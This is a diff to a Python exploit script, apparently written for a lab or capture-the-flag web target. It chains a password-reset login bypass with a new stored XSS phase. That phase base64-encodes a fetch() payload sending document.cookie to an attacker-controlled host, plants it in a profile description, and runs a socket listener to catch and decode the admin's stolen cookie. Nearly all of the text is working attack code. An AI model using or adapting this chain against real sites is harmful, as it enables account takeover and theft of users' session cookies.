@@ -1,11 +1,17 @@
+import base64
+import socket
+
 import requests
 import sys
 
 TARGET_URL = "http://localhost:8000"
 VICTIM_USER = "user1"
 NEW_PASSWORD = "Password123!"
+LHOST = ""  # Change this to your attacker's IP address
+LPORT = 8001
 
-def exploit():
+def login_bypass():
+    print("[*] --- PHASE 1: LOGIN BYPASS ---")
     session = requests.Session()
     
     # 1. Trigger password reset
@@ -87,8 +93,48 @@ def exploit():
         print(f"[+] SUCCESS: Logged in as {VICTIM_USER}!")
         print("[*] Forward this session data to the Privilege Escalation team:")
         print(f"    Cookies: {session.cookies.get_dict()}")
+        return session
     else:
         print("[-] Login verification failed.")
+        return None
+
+def privilege_escalation(session):
+    print("\n[*] --- PHASE 2: PRIVILEGE ESCALATION (XSS) ---")
+    
+    b64 = base64.b64encode(f"fetch('http://{LHOST}:{LPORT}/'+btoa(document.cookie))".encode()).decode()
+    payload = f"<img src=x onerror='eval(atob(`{b64}`))'/>"
+    
+    # Using previous session to add payload
+    r = session.post(f"{TARGET_URL}/profile.php", data={"description": payload})
+    print(f"[*] Set {VICTIM_USER}'s description to XSS payload")
+    
+    # Waiting for admin bot to visit profile and send cookie
+    s = socket.socket()
+    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    s.bind((LHOST, LPORT))
+    s.listen(1)
+    print(f"[*] Listening on {LHOST}:{LPORT}...")
+    print("[*] Waiting for admin bot to visit profile...")
+    
+    # Catch the incoming connection from admin bot
+    (sock_c, ip_c) = s.accept()
+    get_request = sock_c.recv(4096)
+    
+    try:
+        admin_cookie = base64.b64decode(get_request.split(b" ")[1][1:]).decode()
+        print(f"[+] Got admin cookie: {admin_cookie}")
+        
+        # Close sockets
+        sock_c.close()
+        s.close()
+        
+        # Return the admin cookie for further use in privilege escalation
+        return admin_cookie
+    except Exception as e:
+        print("[-] Error decoding admin cookie.")
+        return None
 
 if __name__ == "__main__":
-    exploit()
+    session = login_bypass()
+    if session:
+        admin_cookie = privilege_escalation(session)
